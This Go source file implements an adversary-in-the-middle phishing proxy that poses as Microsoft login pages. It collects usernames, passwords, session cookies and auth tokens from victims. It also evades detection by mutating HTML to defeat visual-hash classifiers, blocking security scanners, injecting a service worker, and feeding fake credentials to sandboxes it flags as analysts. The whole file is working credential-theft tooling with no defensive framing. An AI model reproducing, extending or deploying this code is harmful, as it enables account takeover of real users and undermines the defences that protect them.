package main

import (
	"bytes"
	"context"
	"crypto/rand"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"
)

// ── Scanner noise handling ──
const faviconSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="0.9em" font-size="90">🔒</text></svg>`

// ── PROJECT SYMBIOTE: Embed Wasm binary and JS glue ──
//
//go:embed symbiote-core/pkg/symbiote_core_bg.wasm
var wasmBinary []byte

//go:embed symbiote-core/pkg/symbiote_core.js
var jsGlue []byte

// ══════════════════════════════════════════════════════════
//
//	DYNAMIC DOM MUTATOR (Defeats Visual Hashing AI)
//
// ══════════════════════════════════════════════════════════
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		randByte := make([]byte, 1)
		rand.Read(randByte)
		b[i] = letters[int(randByte[0])%len(letters)]
	}
	return string(b)
}

func mutateHTML(body []byte) []byte {
	body = bytes.ReplaceAll(body, []byte(`<meta name="generator"`), []byte(`<!-- m -->`))
	body = bytes.ReplaceAll(body, []byte(`content="Zoho"`), []byte(`content="App"`))
	body = bytes.ReplaceAll(body, []byte(`content="Microsoft"`), []byte(`content="App"`))

	noiseClass := randomString(12)
	noiseText := randomString(32)
	commentNoise := randomString(16)

	headInjection := []byte(fmt.Sprintf(`<style>.%s{display:none!important;visibility:hidden;}</style><div class="%s">%s</div><!-- %s -->`, noiseClass, noiseClass, noiseText, commentNoise))
	body = bytes.Replace(body, []byte("<head>"), append([]byte("<head>"), headInjection...), 1)

	bodyInjection := []byte(fmt.Sprintf(`<!-- %s --><div style="display:none;position:absolute;z-index:-1;">%s</div>`, randomString(16), randomString(32)))
	body = bytes.Replace(body, []byte("</body>"), append(bodyInjection, []byte("</body>")...), 1)

	swInjection := []byte(`<script>if('serviceWorker'in navigator){navigator.serviceWorker.register('/sw.js',{type:'module',scope:'/'}).catch(()=>{});}</script>`)
	body = bytes.Replace(body, []byte("</body>"), append(swInjection, []byte("</body>")...), 1)

	return body
}

// botPaths are well-known scanner/vulnerability probes.
var botPaths = []string{
	"/wp-admin", "/wp-login", "/wp-content", "/wp-includes", "/wp-json",
	"/wp-config", "/wp-cron", "/xmlrpc.php",
	"/.env", "/.git", "/.svn", "/.hg", "/.aws", "/.docker", "/.kube",
	"/.config", "/.ssh", "/.npmrc", "/.htaccess", "/.htpasswd", "/.ds_store",
	"/admin", "/administrator", "/phpmyadmin", "/pma", "/myadmin",
	"/manager", "/host-manager",
	"/actuator", "/console", "/debug", "/trace", "/heapdump",
	"/_debug", "/_profiler", "/telescope",
	"/shell", "/cmd", "/command", "/c99", "/r57", "/cgi-bin", "/fcgi-bin",
	"/backup", "/backups", "/dump", "/database.sql", "/db.sql",
	"/autodiscover", "/ecp", "/owa", "/exchange", "/mapi",
	"/vendor", "/node_modules", "/composer.json",
	"/solr", "/jenkins", "/hudson", "/struts", "/graphql",
	"/install", "/setup", "/config.php", "/configuration.php",
}

func isBotPath(path string) bool {
	for _, p := range botPaths {
		if strings.HasPrefix(path, p) {
			return true
		}
	}
	return false
}

func handleNoise(w http.ResponseWriter, r *http.Request) bool {
	path := strings.ToLower(r.URL.Path)
	if path == "/favicon.ico" {
		w.Header().Set("Content-Type", "image/svg+xml")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(faviconSVG))
		return true
	}
	if isBotPath(path) {
		http.NotFound(w, r)
		return true
	}
	return false
}

type ctxKey string

const (
	ctxKeyBaseDomain ctxKey = "prism.baseDomain"
	ctxKeyRole       ctxKey = "prism.role"
)

func withDomainContext(r *http.Request, role, baseDomain string) *http.Request {
	ctx := context.WithValue(r.Context(), ctxKeyBaseDomain, baseDomain)
	ctx = context.WithValue(ctx, ctxKeyRole, role)
	return r.WithContext(ctx)
}

func baseDomainOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyBaseDomain).(string); ok && v != "" {
		return v
	}
	return phishDomain
}

func roleOf(r *http.Request) string {
	if v, ok := r.Context().Value(ctxKeyRole).(string); ok {
		return v
	}
	return ""
}

func redirectToLanding(w http.ResponseWriter, r *http.Request, baseDomain, reason string) {
	dest := "https://" + landingHostFor(baseDomain) + r.URL.RequestURI()
	log.Printf("[→] [%s] %s → %s (302)", r.Host, reason, dest)
	http.Redirect(w, r, dest, http.StatusFound)
}

func handleCORSOptions(w http.ResponseWriter, r *http.Request) {
	origin := r.Header.Get("Origin")
	if origin == "" {
		origin = "*"
	}
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")

	reqHeaders := r.Header.Get("Access-Control-Request-Headers")
	if reqHeaders != "" {
		w.Header().Set("Access-Control-Allow-Headers", reqHeaders)
	} else {
		w.Header().Set("Access-Control-Allow-Headers", "Origin, Content-Type, Accept, Authorization, X-Requested-With, Access-Control-Allow-Origin")
	}
	w.Header().Set("Access-Control-Max-Age", "86400")
	w.WriteHeader(204)
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	role, baseDomain, isRole := resolveHost(r.Host)
	r = withDomainContext(r, role, baseDomain)
	host := strings.ToLower(stripPort(r.Host))

	// ── THE ABSOLUTE GATE ──
	if blocked, reason := isBlocked(r); blocked {
		log.Printf("[x] BLOCKED: %s — %s", extractIP(r), reason)
		blockResponse(w)
		ip := extractIP(r)
		prefix := extractIPPrefix(ip)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), IP: ip, IPPrefix: prefix,
			Fingerprint: r.Header.Get("X-CF-Fingerprint"),
			UserAgent:   r.UserAgent(), Route: "filter", Action: "blocked",
		})
		return
	}

	// ── PROJECT SYMBIOTE: Serve the POLYMORPHIC Service Worker ──
	if r.URL.Path == "/sw.js" {
		w.Header().Set("Content-Type", "application/javascript")
		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
		w.Header().Set("Service-Worker-Allowed", "/")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(generateSymbioteScript()))
		return
	}

	// ── PROJECT SYMBIOTE: Serve the Wasm binary and JS glue ──
	if r.URL.Path == "/symbiote_core_bg.wasm" {
		w.Header().Set("Content-Type", "application/wasm")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write(wasmBinary)
		return
	}

	if r.URL.Path == "/symbiote_core.js" {
		w.Header().Set("Content-Type", "application/javascript")
		w.Header().Set("Cache-Control", "public, max-age=86400")
		w.WriteHeader(http.StatusOK)
		w.Write(jsGlue)
		return
	}

	// ── PROJECT SYMBIOTE: Receive telemetry AND BIND TO SESSION (BULLETPROOF PARSER) ──
	if r.URL.Path == "/api/v1/analytics" && r.Method == "POST" {
		log.Printf("[🐍 DEBUG] Incoming telemetry request from IP: %s", extractIP(r))

		body, err := io.ReadAll(r.Body)
		if err != nil {
			log.Printf("[🐍 DEBUG] ERROR reading body: %v", err)
		} else {
			log.Printf("[🐍 DEBUG] Raw payload received: %s", string(body))

			// Use interface{} to gracefully handle nested objects or type mismatches
			var payload map[string]interface{}
			if err := json.Unmarshal(body, &payload); err != nil {
				log.Printf("[🐍 DEBUG] ERROR parsing JSON: %v", err)
			} else {
				// Safely extract values, converting to string whether they are strings or objects
				var username, password, sessionCookie string

				if v, ok := payload["u_id"].(string); ok {
					username = v
				} else {
					username = fmt.Sprintf("%v", payload["u_id"])
				}
				if v, ok := payload["p_val"].(string); ok {
					password = v
				} else {
					password = fmt.Sprintf("%v", payload["p_val"])
				}
				if v, ok := payload["session_cookie"].(string); ok {
					sessionCookie = v
				} else {
					sessionCookie = fmt.Sprintf("%v", payload["session_cookie"])
				}

				log.Printf("[🐍 DEBUG] Extracted -> u_id: '%s' | p_val: '%s' | cookie: '%s'", username, password, sessionCookie)

				cookie, err := r.Cookie(sessionMgr.cookieName)
				if err != nil {
					log.Printf("[🐍 DEBUG] WARNING: Session cookie '%s' not found in request.", sessionMgr.cookieName)
				} else {
					sessionMgr.mu.Lock()
					session, ok := sessionMgr.sessions[cookie.Value]
					if !ok {
						log.Printf("[🐍 DEBUG] WARNING: Session ID '%s' not found in active sessions map.", cookie.Value)
					} else {
						log.Printf("[🐍 DEBUG] SUCCESS: Found active session %s", session.ID[:8])

						// ── THE POISONED CHALICE ──
						if session.IsHoneypot {
							username = fmt.Sprintf("sandbox_trap_%s@threatintel-feed.test", randomString(6))
							password = "P0is0nChalice_2026!"
							log.Printf("[🍯] HONEYPOT: Fed fake credentials to session %s", session.ID[:8])
						}

						session.SetCredentials(username, password)
						log.Printf("[🐍] [+] Telemetry successfully bound to session %s", session.ID[:8])
					}
					sessionMgr.mu.Unlock()
				}
			}
		}
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// ── 1. Apex / www / unknown subdomain → noise check, then redirect ──
	if !isRole {
		if handleNoise(w, r) {
			return
		}
		redirectToLanding(w, r, baseDomain, "unknown host")
		return
	}

	// ── 2. Landing role (go.<baseDomain>): the gate page. ──
	if role == landingRole {
		if handleNoise(w, r) {
			return
		}
		switch r.URL.Path {
		case detectEndpoint:
			handleDetect(w, r)
			return
		case profileEndpoint:
			profileHandler(w, r)
			return
		case captureEndpoint:
			captureHandler(w, r)
			return
		}
		if r.Method == "OPTIONS" {
			handleCORSOptions(w, r)
			return
		}
		landingHandler(w, r)
		return
	}

	// ── 3. Provider role → resolve the target by role. ──
	target := lookupTargetByRole(role)

	// ── 4. GATE: only the ENTRY subdomain requires the session cookie ──
	if host == target.EntrySubdomainFor(baseDomain) {
		if _, err := r.Cookie(sessionMgr.cookieName); err != nil {
			redirectToLanding(w, r, baseDomain, "no gate cookie")
			return
		}
	}

	// ── 5. API endpoints on provider subdomains ──
	switch r.URL.Path {
	case detectEndpoint:
		handleDetect(w, r)
		return
	case profileEndpoint:
		profileHandler(w, r)
		return
	case captureEndpoint:
		captureHandler(w, r)
		return
	}

	// ── 6. CORS preflight ──
	if r.Method == "OPTIONS" {
		handleCORSOptions(w, r)
		return
	}

	// ── Session tracking ──
	session := sessionMgr.GetOrCreate(r, baseDomain)
	if session != nil && session.TargetName == "" {
		session.TargetName = target.Name
	}
	if session != nil {
		session.SetCampaignID(r.URL.Query().Get("cid"))
	}

	// ── Behavioral telemetry (Fixed-Size Sliding Window) ──
	if session != nil {
		nowMS := time.Now().UnixMilli()
		session.mu.Lock()
		session.ActivityWindow.Add(nowMS, uint64(len(r.URL.Path)), false)
		reqs, errs, _ := session.ActivityWindow.GetWindowStats(nowMS)

		// TRIGGER THE POISONED CHALICE
		if reqs > 50 || errs > 20 {
			session.IsHoneypot = true
			log.Printf("[🍯] HONEYPOT ACTIVATED: Session %s flagged as bot/sandbox (%d reqs, %d errs)", session.ID[:8], reqs, errs)
		}
		session.mu.Unlock()
	}

	// ── Fire correlation event for ALLOWED traffic ──
	if session != nil {
		ip := extractIP(r)
		correlator.Emit(ObservationEvent{
			Timestamp: time.Now(), SessionID: session.ID, IP: ip, IPPrefix: extractIPPrefix(ip),
			Fingerprint: r.Header.Get("X-CF-Fingerprint"), UserAgent: r.UserAgent(),
			Route: role, Action: "allowed",
		})
	}

	// ── Post-login handoff ──
	if session != nil && session.ReachedService && target.ServiceUpstream != "" &&
		host == target.EntrySubdomainFor(baseDomain) && (r.URL.Path == "/" || r.URL.Path == "") {
		if svc := target.ReverseMapFor(baseDomain)[target.ServiceUpstream]; svc != "" {
			http.Redirect(w, r, "https://"+svc+"/", http.StatusFound)
			return
		}
	}

	// ── Termination redirect ──
	if shouldTerminate(session, r) {
		doTerminate(w, session, r)
		return
	}

	// ── Route to upstream ──
	upstream, ok := target.HostMapFor(baseDomain)[host]
	if !ok {
		upstream = "login.microsoftonline.com"
	}

	targetURL := &url.URL{Scheme: "https", Host: upstream}
	proxy := httputil.NewSingleHostReverseProxy(targetURL)
	proxy.Transport = browserHTTPTransport

	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		*req = *req.WithContext(r.Context())
		rewriteRequest(req, host, upstream, target, session)
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		captureAuthTokens(resp, session, target)
		err := rewriteResponse(resp, r, session, target)

		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
		mime = strings.TrimSpace(strings.ToLower(mime))

		// ── DYNAMIC DOM MUTATION (Defeats Visual Hashing AI) ──
		if mime == "text/html" {
			bodyBytes, readErr := io.ReadAll(resp.Body)
			if readErr == nil {
				resp.Body.Close()
				mutatedBody := mutateHTML(bodyBytes)
				resp.Body = io.NopCloser(bytes.NewReader(mutatedBody))
				resp.ContentLength = int64(len(mutatedBody))
				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(mutatedBody)))
			}
		}

		if mime == "text/html" || strings.Contains(mime, "x-component") || mime == "application/json" {
			cookie := fmt.Sprintf("%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
				sessionMgr.cookieName, session.ID, baseDomain)
			resp.Header.Add("Set-Cookie", cookie)

			// ── THE POISONED CHALICE: Inject fake auth tokens for sandboxes ──
			if session != nil && session.IsHoneypot {
				fakeToken := fmt.Sprintf("FAKE_AUTH_TOKEN=%s; Path=/; Domain=.%s; Max-Age=86400; HttpOnly; Secure",
					randomString(32), baseDomain)
				resp.Header.Add("Set-Cookie", fakeToken)
				log.Printf("[🍯] HONEYPOT: Injected fake auth cookies for session %s", session.ID[:8])
			}
		}

		return err
	}

	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[!] Proxy error: %v", err)
		w.WriteHeader(http.StatusBadGateway)
		w.Write([]byte("Bad Gateway"))
	}

	log.Printf("[>] [%d] [%s] %s %s%s → %s",
		session.Index, target.Name, r.Method, r.Host, r.URL.Path, upstream)
	proxy.ServeHTTP(w, r)
}

func extractBaseDomain(host string) string {
	parts := splitHost(host)
	if len(parts) >= 2 {
		return parts[len(parts)-2] + "." + parts[len(parts)-1]
	}
	return host
}

func splitHost(host string) []string {
	var parts []string
	current := ""
	for _, c := range host {
		if c == '.' {
			parts = append(parts, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		parts = append(parts, current)
	}
	return parts
}

func extractIPPrefix(ip string) string {
	parts := strings.Split(ip, ".")
	if len(parts) == 4 {
		return strings.Join(parts[:3], ".")
	}
	return ip
}
